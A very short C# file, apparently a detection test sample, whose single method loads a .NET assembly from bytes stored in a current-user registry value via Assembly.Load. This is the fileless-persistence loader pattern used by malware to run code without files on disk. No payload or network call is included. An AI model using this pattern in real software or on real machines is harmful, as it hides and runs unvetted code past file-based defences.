using System.Reflection;
using Microsoft.Win32;
class Spaced {
 static object Run() {
   return Assembly.Load((byte [ ]) Registry.GetValue(@"HKEY_CURRENT_USER\Software\Renamed", "other", null));
 }
}
